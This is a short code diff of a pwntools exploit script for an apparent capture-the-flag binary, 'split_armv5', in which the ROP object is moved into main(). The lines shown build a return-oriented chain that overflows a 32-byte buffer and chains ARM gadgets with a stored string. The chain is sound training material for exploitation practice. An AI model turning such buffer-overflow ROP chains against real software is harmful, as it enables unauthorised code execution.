@@ -1,7 +1,6 @@
 from pwn import *
 
 elf = ELF("split_armv5")
-rop = ROP(elf)
 
 context.binary = elf
 context.terminal = ['konsole', '-e']
@@ -24,6 +23,7 @@ BUFFER_SIZE = 32
 READ_SIZE = 96
 
 def main():
+    rop = ROP(elf)
     rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
     rop.raw(next(elf.search(asm('pop {r3, pc}'))))
     rop.raw([elf.symbols.usefulString, next(elf.search(asm('mov r0, r3; pop {fp, pc}')))])
